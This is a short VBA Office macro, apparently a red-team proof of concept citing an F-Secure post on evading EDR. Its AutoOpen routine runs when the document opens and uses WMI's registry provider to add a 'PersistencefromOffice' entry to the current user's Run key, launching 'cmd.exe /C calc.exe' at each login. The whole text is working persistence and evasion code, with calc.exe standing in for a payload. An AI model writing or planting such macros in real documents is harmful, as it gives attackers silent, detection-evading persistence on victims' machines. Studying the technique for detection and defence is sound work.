Sub AutoOpen()
' https://blog.f-secure.com/dechaining-macros-and-evading-edr/
Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "PersistencefromOffice", "cmd.exe /C calc.exe"

End Sub

